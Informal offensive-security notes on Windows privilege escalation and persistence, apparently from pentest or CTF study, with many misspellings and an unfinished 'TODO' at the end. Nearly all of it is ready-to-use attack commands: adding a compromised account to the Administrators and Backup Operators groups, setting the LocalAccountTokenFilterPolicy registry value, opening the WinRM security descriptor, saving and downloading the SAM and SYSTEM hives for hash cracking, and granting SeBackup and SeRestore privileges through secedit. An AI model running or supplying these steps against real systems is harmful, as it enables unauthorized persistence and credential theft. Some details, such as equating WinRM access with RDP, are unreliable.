Windows Privillege Escelation

A complete description of the various Windows privilleges -> https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

The basic syntax for assigning a user to a group is:

`net localgroup <GROUP> <USER> /add

Adding to the admin group:

`net localgroup Administrators <USER> /add`

If using the admin group seems to hot you can try Backup Operators group

`net localgroup "Backup Operators" <USER> /add`

A few things about the "Backup Operators Group"

    - No Administrator Privilleges by default
    - No RDP access by default
    - Can read SAM/SYSTEM Registry Hives ignoring DACL's in place

Thus the path is 1) Add to RDP access group -> 2) Dump Hives -> 3) Hopefully crack an Admin hash

Giving a user RDP access, note you must have their password to use RDP:

`net localgroup "Remote Management Users" <USER> /add

The UAC `LocalAccountTokenFilterPolicy` will strip users of their Administrator privlleges over RDP. You can remove this with:
`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`

Another way of accessing RDP would be through modifying the security descriptor of the WinRM service. A security descriptor is 
like a ACL but applied to system facillities. Open the configuration in Powershell

`Set-PSSessionConfiguration -Name Microsoft.Powershell -showSecurityDescriptorUi`

From here you can assign a user of your choice to have "Full Control/All Operations"

Dumping Registry Hives ;) (via RDP)

`reg save hklm\system system.bak; download system.bak`

`reg save hklm\sam sam.bak; download sam.bak` 

These can then be dumped with a cracking tool of your choice

Privilleges

SeBackupPrivillege -> Can read any file on system and ignore the DACL in place
 
SeRestorePrivillege -> The user can write any file on the system ignoring DACL's

As with groups privilleges can be assigned directly to a user independent of the group they belong to, to do so use `secedit`

First export the current configuration to a temporary file:
 `secedit /export /cfg config.inf` 

Open this in notepad (it'd be great if they could just ship with vi by default like literally every other operating system)

Next to the privillege you would like to add to you're user, add the username to the end 

Ex. `SeRestorePrivllege = blah, blah blah, <COMPRIMISED_ACCOUNT>` 

Next you'll need to load the configuration onto the system, but first convert it from .inf to .sdb

`secedit /import /cfg config.inf /db config.sdb`

`secedit /configure /db config.sdb /cfg config.inf`

TODO RID HIjakcing
